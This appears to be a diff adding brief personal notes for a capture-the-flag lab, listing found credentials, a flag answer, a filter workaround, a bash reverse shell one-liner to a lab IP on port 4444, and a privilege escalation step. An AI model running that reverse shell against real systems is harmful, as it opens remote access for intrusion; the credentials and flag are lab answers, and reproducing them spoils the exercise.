@@ -1,0 +1,12 @@
+Username: R1ckRul3s
+
+Password in Robots.txt: Wubbalubbadubdub 
+
+Use less instead of cat to output files
+
+First ingredient: mr. meeseek hair
+
+To get reverse shell:
+bash -c 'exec bash -i &>/dev/tcp/10.11.21.215/4444 <&1'
+
+Get root with sudo su
